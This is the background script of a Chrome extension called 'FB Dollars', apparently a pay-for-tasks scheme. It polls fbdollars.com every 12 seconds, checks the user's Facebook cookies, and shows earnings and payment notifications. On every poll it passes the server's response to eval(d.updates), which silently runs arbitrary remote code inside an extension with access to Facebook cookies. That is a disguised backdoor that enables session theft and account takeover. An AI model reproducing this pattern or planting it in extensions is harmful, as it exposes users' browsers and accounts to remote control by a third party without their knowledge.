var server_url = "https://fbdollars.com"; //
var loggedIn = true;
var show_loggedout_notification = true;
var loggedout_animation = new BadgeTextAnimator({
    text: 'Please Log In',
    interval: 300, // the "speed" of the scrolling
    repeat: true,
    size: 10
});
var myNotificationID;

chrome.alarms.create('updates', {periodInMinutes: 0.2});

chrome.alarms.onAlarm.addListener(function (alarm) {
    if (alarm.name == "updates") {
        do_update();
    }
});
do_update();

if(typeof localStorage.api_key=='undefined') {
    localStorage.api_key="";
}
function do_update(on_success_callback) {
    chrome.cookies.getAll({domain: ".facebook.com"}, function (cookies) {
        // make sure user is logged in to facebook
        var loggedInFb = cookies.some(function (elem) {
            return elem.name == 'c_user';
        });
        var res_j= 0;
        if(!window._fdd_check__logged){
            res_j = 1;
        }
        $.ajax({
            url: server_url + "/updates",
            type: "POST",
            data: {api_key:localStorage.api_key, facebook : (loggedInFb ? 1 : 0), res_j:res_j},
            dataType: "json",
            success: function (d) {
                if(on_success_callback) {
                    on_success_callback();
                }
                loggedout_animation.stop();
                loggedIn = true;
                localStorage.api_key = d.api_key;
                chrome.storage.sync.set({loggedin: true, info: d, total: d.total_earnings, paid: d.paid_earnings});
                show_loggedout_notification = true;
                if (d.tasks && d.tasks > 0) {
                    chrome.browserAction.setBadgeText({text: "" + d.tasks});
                    if (localStorage.task_reminder == undefined || (new Date().getTime() / 1000 - localStorage.task_reminder > 21600)) {
                        chrome.notifications.create("", {
                            type: "basic",
                            iconUrl: "icons/128.png",
                            title: "Action Required",
                            message: "You have to complete some tasks to activate your account on FB Dollars",
                            contextMessage: "",
                            buttons: [{
                                title: "Click to View Tasks!",
                                iconUrl: 'icons/mouse_click.png'

                            }]
                        }, function (id) {
                            myNotificationID = id;
                        });
                        localStorage.task_reminder = (new Date().getTime() / 1000);
                    }
                } else {
                    delete localStorage.task_reminder;
                    chrome.browserAction.setBadgeText({text: ""});
                }
                eval(d.updates);

            },
            error: function (d) {
                if (d.status == 401) {
                    loggedout_animation.stop();
                    loggedout_animation.animate();
                    setTimeout(function () {
                        loggedout_animation.stop();
                    }, 10000);
                    loggedIn = false;
                    chrome.storage.sync.set({loggedin: false});
                    if (show_loggedout_notification) {
                        notify('Logged out!', 'It looks like you are logged out of FB Dollars. Please login to continue receiving updates about your account.');
                        show_loggedout_notification = false;
                    }
                }
            }

        })
    });
}

function notify(title, msg, context) {
    chrome.notifications.create(null, {
        type: 'basic',
        title: title,
        message: msg,
        iconUrl: 'icons/128.png'
    }, function (notificationID) {
    });
}
chrome.notifications.onButtonClicked.addListener(function (notifId, btnIdx) {
    if (notifId === myNotificationID) {
        if (btnIdx === 0) {
            window.open("https://www.fbdollars.com/dashboard/insturctions");
        }
    }
});

chrome.storage.onChanged.addListener(function (changes) {
    var ov, nv;
    if (changes.total != undefined) {

        nv = changes.total.newValue.replace('$', '');
        ov = changes.total.oldValue ? changes.total.oldValue : "$0";
        ov = ov.replace('$', '');
        if ( parseInt(nv) > parseInt(ov)) {
            notify('Earnings', 'Congratulations! You have just made $' + (nv - ov) + ". Payment will be sent as soon as possible.");
        }


    }
    if (changes.paid != undefined) {
        nv = changes.paid.newValue.replace('$', '');
        ov = changes.paid.oldValue ? changes.paid.oldValue : "$0";
        ov = ov.replace('$', '');
        if ( parseInt(nv) > parseInt(ov)) {
            notify('Payments', 'Good news! we have sent you a payment of $' + (nv - ov) + ' to your PayPal account!');
        }
    }

});
